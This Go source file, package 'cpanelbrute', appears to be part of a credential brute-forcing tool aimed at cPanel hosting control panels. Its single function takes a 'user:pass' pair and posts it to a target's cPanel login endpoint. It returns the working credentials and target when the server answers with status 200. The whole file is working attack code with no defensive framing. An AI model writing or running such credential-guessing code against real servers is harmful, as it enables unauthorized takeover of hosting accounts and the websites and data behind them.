package cpanelbrute

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
)

func MakeRequest(target string, creds string) ([]string, error) {
	splitedCreds := strings.Split(creds, ":")
	if len(splitedCreds) != 2 {
		err := errors.New("invalid credentials format")
		return nil, err
	}
	target = fmt.Sprintf("%slogin/?login_only=1", target)

	username, password := splitedCreds[0], splitedCreds[1]
	payloadStr := fmt.Sprintf("user=%s&pass=%s", username, password)
	payload := []byte(payloadStr)
	contentType := "application/x-www-form-urlencoded"
	res, err := http.Post(target, contentType, bytes.NewBuffer(payload))

	if err != nil {
		return nil, err
	}
	if res.StatusCode == 200 {
		target = strings.TrimSuffix(target, "/login/?login_only=1")
		splitedCreds = append(splitedCreds, target)
		return splitedCreds, nil
	}
	defer res.Body.Close()
	body, _ := io.ReadAll(res.Body)
	err = errors.New(string(body))
	return nil, err
}
